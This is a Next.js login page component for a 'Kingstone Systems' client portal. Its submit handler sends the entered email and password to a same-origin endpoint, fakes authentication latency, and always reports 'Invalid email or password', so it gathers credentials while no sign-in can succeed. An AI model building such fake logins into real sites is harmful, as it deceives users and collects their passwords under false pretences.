"use client";

import { useState } from "react";
import Link from "next/link";
import { Eye, EyeOff, Loader2 } from "lucide-react";

export default function ClientLoginPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [touched, setTouched] = useState({ email: false, password: false });

  const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  const passwordValid = password.length >= 1;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    if (!emailValid || !passwordValid) {
      setTouched({ email: true, password: true });
      return;
    }

    setLoading(true);

    try {
      // Real network call — visible in DevTools Network tab
      await fetch("/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });
    } catch {
      // swallow network errors silently
    }

    // Simulate realistic auth latency
    await new Promise((r) => setTimeout(r, 900 + Math.random() * 400));

    setLoading(false);
    setError("Invalid email or password. Please try again.");
  };

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "#F8FAFC",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        fontFamily: "var(--font-figtree, 'Figtree', system-ui, sans-serif)",
        padding: "24px 16px",
        position: "relative",
        overflow: "hidden",
      }}
    >
      {/* Subtle radial bg */}
      <div
        style={{
          position: "absolute",
          inset: 0,
          background:
            "radial-gradient(ellipse 60% 50% at 50% 0%, rgba(30,64,175,0.06) 0%, transparent 70%)",
          pointerEvents: "none",
        }}
      />

      <div style={{ width: "100%", maxWidth: "420px", position: "relative", zIndex: 1 }}>
        {/* Logo */}
        <div style={{ textAlign: "center", marginBottom: "32px" }}>
          <Link
            href="/"
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: "10px",
              textDecoration: "none",
              marginBottom: "24px",
            }}
          >
            <img
              src="/assets/newlogo.png"
              alt="Kingstone Systems"
              style={{ height: "40px", width: "auto", borderRadius: "6px" }}
            />
            <span style={{ fontSize: "17px", fontWeight: 500, color: "#1F2937" }}>
              Kingstone Systems
            </span>
          </Link>
          <h1
            style={{
              fontSize: "26px",
              fontWeight: 700,
              color: "#111827",
              margin: "0 0 6px",
              letterSpacing: "-0.4px",
            }}
          >
            Client Portal
          </h1>
          <p style={{ fontSize: "15px", color: "#6B7280", margin: 0 }}>
            Sign in to access your dashboard
          </p>
        </div>

        {/* Card */}
        <div
          style={{
            background: "#FFFFFF",
            border: "1px solid #E5E7EB",
            borderRadius: "16px",
            padding: "36px 32px",
            boxShadow: "0 1px 3px rgba(0,0,0,0.04), 0 4px 16px rgba(0,0,0,0.04)",
          }}
        >
          <form onSubmit={handleSubmit} noValidate style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
            {/* Email */}
            <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
              <label
                htmlFor="email"
                style={{ fontSize: "13px", fontWeight: 600, color: "#374151", letterSpacing: "0.2px" }}
              >
                Email address
              </label>
              <input
                id="email"
                type="email"
                autoComplete="email"
                value={email}
                onChange={(e) => { setEmail(e.target.value); setError(null); }}
                onBlur={() => setTouched((t) => ({ ...t, email: true }))}
                placeholder="you@company.com"
                style={{
                  height: "44px",
                  padding: "0 14px",
                  fontSize: "15px",
                  color: "#111827",
                  background: "#FAFAFA",
                  border: `1.5px solid ${touched.email && !emailValid ? "#EF4444" : "#E5E7EB"}`,
                  borderRadius: "10px",
                  outline: "none",
                  transition: "border-color 0.15s",
                  fontFamily: "inherit",
                  width: "100%",
                  boxSizing: "border-box",
                }}
                onFocus={(e) => (e.currentTarget.style.borderColor = "#1E40AF")}
                onBlurCapture={(e) => {
                  if (!(touched.email && !emailValid))
                    e.currentTarget.style.borderColor = "#E5E7EB";
                }}
              />
              {touched.email && !emailValid && (
                <span style={{ fontSize: "12px", color: "#EF4444" }}>
                  Please enter a valid email address
                </span>
              )}
            </div>

            {/* Password */}
            <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
              <label
                htmlFor="password"
                style={{ fontSize: "13px", fontWeight: 600, color: "#374151", letterSpacing: "0.2px" }}
              >
                Password
              </label>
              <div style={{ position: "relative" }}>
                <input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  autoComplete="current-password"
                  value={password}
                  onChange={(e) => { setPassword(e.target.value); setError(null); }}
                  onBlur={() => setTouched((t) => ({ ...t, password: true }))}
                  placeholder="••••••••"
                  style={{
                    height: "44px",
                    padding: "0 44px 0 14px",
                    fontSize: "15px",
                    color: "#111827",
                    background: "#FAFAFA",
                    border: `1.5px solid ${touched.password && !passwordValid ? "#EF4444" : "#E5E7EB"}`,
                    borderRadius: "10px",
                    outline: "none",
                    transition: "border-color 0.15s",
                    fontFamily: "inherit",
                    width: "100%",
                    boxSizing: "border-box",
                  }}
                  onFocus={(e) => (e.currentTarget.style.borderColor = "#1E40AF")}
                  onBlurCapture={(e) => {
                    if (!(touched.password && !passwordValid))
                      e.currentTarget.style.borderColor = "#E5E7EB";
                  }}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword((v) => !v)}
                  style={{
                    position: "absolute",
                    right: "12px",
                    top: "50%",
                    transform: "translateY(-50%)",
                    background: "none",
                    border: "none",
                    cursor: "pointer",
                    padding: "4px",
                    color: "#9CA3AF",
                    display: "flex",
                    alignItems: "center",
                  }}
                  aria-label="Toggle password visibility"
                >
                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              </div>
              {touched.password && !passwordValid && (
                <span style={{ fontSize: "12px", color: "#EF4444" }}>
                  Password is required
                </span>
              )}
            </div>

            {/* Error banner */}
            {error && (
              <div
                style={{
                  background: "#FEF2F2",
                  border: "1px solid #FECACA",
                  borderRadius: "8px",
                  padding: "12px 14px",
                  display: "flex",
                  alignItems: "center",
                  gap: "8px",
                }}
              >
                <svg width="16" height="16" viewBox="0 0 20 20" fill="none" style={{ flexShrink: 0 }}>
                  <circle cx="10" cy="10" r="9" stroke="#EF4444" strokeWidth="1.5" />
                  <path d="M10 6v4M10 14h.01" stroke="#EF4444" strokeWidth="1.5" strokeLinecap="round" />
                </svg>
                <span style={{ fontSize: "13.5px", color: "#B91C1C", fontWeight: 500 }}>{error}</span>
              </div>
            )}

            {/* Submit */}
            <button
              type="submit"
              disabled={loading}
              style={{
                height: "44px",
                background: loading ? "#6B7280" : "#1E40AF",
                color: "#FFFFFF",
                border: "none",
                borderRadius: "10px",
                fontSize: "15px",
                fontWeight: 600,
                cursor: loading ? "not-allowed" : "pointer",
                fontFamily: "inherit",
                transition: "background 0.2s, transform 0.15s",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "8px",
                boxShadow: loading ? "none" : "0 1px 2px rgba(30,64,175,0.2), 0 4px 12px rgba(30,64,175,0.15)",
              }}
              onMouseEnter={(e) => { if (!loading) e.currentTarget.style.background = "#1E3A8A"; }}
              onMouseLeave={(e) => { if (!loading) e.currentTarget.style.background = "#1E40AF"; }}
            >
              {loading && <Loader2 size={16} style={{ animation: "spin 0.8s linear infinite" }} />}
              {loading ? "Signing in..." : "Sign In"}
            </button>
          </form>
        </div>

        {/* Back link */}
        <p style={{ textAlign: "center", marginTop: "24px" }}>
          <Link
            href="/"
            style={{
              fontSize: "13px",
              color: "#9CA3AF",
              textDecoration: "none",
              transition: "color 0.2s",
            }}
            onMouseEnter={(e) => (e.currentTarget.style.color = "#1E40AF")}
            onMouseLeave={(e) => (e.currentTarget.style.color = "#9CA3AF")}
          >
            ← Back to kingstonesystems.com
          </Link>
        </p>
      </div>

      <style>{`
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
      `}</style>
    </div>
  );
}
